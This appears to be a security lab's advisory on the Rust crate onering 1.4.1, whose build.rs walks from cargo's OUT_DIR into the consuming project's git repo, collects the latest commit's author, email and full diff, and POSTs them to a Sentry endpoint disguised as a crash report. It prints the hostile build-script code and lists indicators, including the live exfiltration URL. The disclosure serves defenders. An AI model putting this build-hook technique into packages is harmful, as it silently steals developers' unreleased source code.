---
title: "onering: a crate that leaks unreleased source"
date: 2026-06-10
summary: "The poison runs in your repo, not the library's — cargo's build dir leads build.rs to the consuming project's git tree, where it scrapes the latest commit's author, email and full patch, then POSTs it as a routine Sentry crash report."
packageName: onering
ecosystem: crates.io
---

<img src="/assets/images/onering-source-leak.jpg" alt="Meme: the Flex Tape leak gag — a sawn-open tank labeled SOFTWARE SUPPLYCHAIN gushing water, and a hand labeled POST-PUBLISH SCANNING slapping the hole shut; onering's build.rs is the leak, caught only after it shipped." style="width: 60%; height: auto;">

`onering` is a real, useful crate — a high-throughput LMAX-Disruptor-style queue, some 2,776 lines of genuine library code credited to its actual author — and every file of it is honest except the one `cargo` runs before any of it compiles: `build.rs`.

## build.rs POSTs your git diff to Sentry

At build time — before a line of the library compiles — the script shells out to git for the latest commit's author and email, then for that commit's full diff: the developer's newest, often-unpublished source changes. It packs both into a Sentry envelope and posts them to an ingest endpoint hard-coded in the source, so to a network monitor and to Sentry's own servers the leak is indistinguishable from a Rust app reporting a crash — traffic that is rarely inspected and almost never blocked. The cleverer half is *where* it runs: the build script reads cargo's `OUT_DIR` and walks up past the `target/` directory into its parent, landing not in onering's own tree but in the consuming project's repo — so it harvests the victim developer's unreleased commit, not the library's.

{% raw %}
<pre class="lang-js"><code><span class="tok-com">// build.rs — cargo runs this before a single line of the library compiles</span>
<span class="tok-kw">let</span> <span class="tok-builtin">Ok</span>(commit) = <span class="tok-fn">git</span>(&amp;project_path, &amp;[<span class="tok-str">"log"</span>, <span class="tok-str">"-n"</span>, <span class="tok-str">"1"</span>,
    <span class="tok-str">r#"--pretty=format:{"commit":"%H","author":"%an","email":"%ae",...}"#</span>]) <span class="tok-kw">else</span> { <span class="tok-kw">return</span> };
<span class="tok-kw">let</span> <span class="tok-builtin">Ok</span>(patch) = <span class="tok-fn">git</span>(&amp;project_path, &amp;[<span class="tok-str">"diff"</span>, <span class="tok-str">"HEAD^"</span>, <span class="tok-str">"HEAD"</span>]) <span class="tok-kw">else</span> { <span class="tok-kw">return</span> };   <span class="tok-com">// HEAD^ errors on a 1-commit repo → silent bail</span>

<span class="tok-kw">let</span> payload = <span class="tok-fn">format!</span>(<span class="tok-str">r#"{{"event_id":"{}","dsn":"https://8197…@o4511…ingest.de.sentry.io/4511…"}}</span>
<span class="tok-str">{{"type":"event"}}</span>
<span class="tok-str">{{"message":"on build","level":"info","platform":"rust","tags":{commit},"extra":{{"patch":"{}"}}}}"#</span>,
    <span class="tok-builtin">Uuid</span>::<span class="tok-fn">new_v4</span>().<span class="tok-fn">as_simple</span>(), patch.<span class="tok-fn">replace</span>(<span class="tok-str">'"'</span>, <span class="tok-str">"\\\""</span>).<span class="tok-fn">replace</span>(<span class="tok-str">'\n'</span>, <span class="tok-str">"\\n"</span>));

<span class="tok-kw">let</span> <span class="tok-builtin">Ok</span>(_) = <span class="tok-fn">request</span>(<span class="tok-str">"POST"</span>, <span class="tok-str">"https://o4511…ingest.de.sentry.io/api/4511…/envelope/"</span>,
    &amp;[<span class="tok-str">"Content-Type: application/x-sentry-envelope"</span>], &amp;payload) <span class="tok-kw">else</span> { <span class="tok-kw">return</span> };   <span class="tok-com">// request() = curl subprocess</span>
</code></pre>
{% endraw %}

Every step bails silently on error, and the diff itself is one such failure: a repo with a single commit has no `HEAD^`, so the leak does nothing there and fires only against projects with history worth taking.

| | File | Trait | Evidence |
| --- | --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `build.rs` | `objectives/supply-chain/recon-exfil/install-hook` | Assembles a Sentry envelope from `git log` + `git diff HEAD^ HEAD` and POSTs it |
| <span class="sev-dot hostile" title="hostile"></span> | `build.rs` | `objectives/supply-chain/install-hook/build/behavioral` | Build script reads the environment and POSTs the payload outbound via curl |
| <span class="sev-dot notable" title="notable"></span> | `build.rs` | `micro-behaviors/process/create/direct` | Spawns `git` and `curl` subprocesses via `Command::new` |
| <span class="sev-dot notable" title="notable"></span> | `build.rs` | `micro-behaviors/os/env/access` | Reads `OUT_DIR` to walk up into the consuming repo |
| <span class="sev-dot notable" title="notable"></span> | `build.rs` | `micro-behaviors/communications/http/download/curl` | `Command::new("curl")` POSTs to `ingest.de.sentry.io` |

## Package metadata

| Field | Value |
| --- | --- |
| name | `onering` |
| version | `1.4.1` |
| authors | `Laurent Wouters <lwouters@cenotelie.fr>` |
| description | `High throughput synchronous queue` |
| license | `MIT` |
| edition | `2024` |
| build | `build.rs` |
| repository | `https://github.com/cenotelie/onering` |

The library keeps its promise of high throughput; the build script keeps a copy of your unreleased source and ships it to a stranger, dressed as a crash report — precious.

## Indicators

| Type | Value |
| --- | --- |
| Crate | `onering-1.4.1.crate` |
| Crate SHA-256 | [`bf1a59c082131ee826cda6c5c2a50857286f8dbb5f9851c368d1117d558ad41e`](https://lab.atomdrift.org/file/bf1a59c082131ee826cda6c5c2a50857286f8dbb5f9851c368d1117d558ad41e) |
| `build.rs` SHA-256 | [`d46497217da839e05b88c745b655ccaa49e0bdd45e2b706d132711c79fb38c28`](https://lab.atomdrift.org/file/d46497217da839e05b88c745b655ccaa49e0bdd45e2b706d132711c79fb38c28) |
| Sentry DSN | `https://8197ee42c4f59c83f4cc6d48f5bae821@o4511539639222272.ingest.de.sentry.io/4511539669368912` |
| Exfil endpoint | `https://o4511539639222272.ingest.de.sentry.io/api/4511539669368912/envelope/` |

*Independently reported first by Charlie Eriksen: [cenotelie/onering#1](https://github.com/cenotelie/onering/issues/1) pins the `build.rs` to commit 45e552f and remains open with no maintainer reply.*
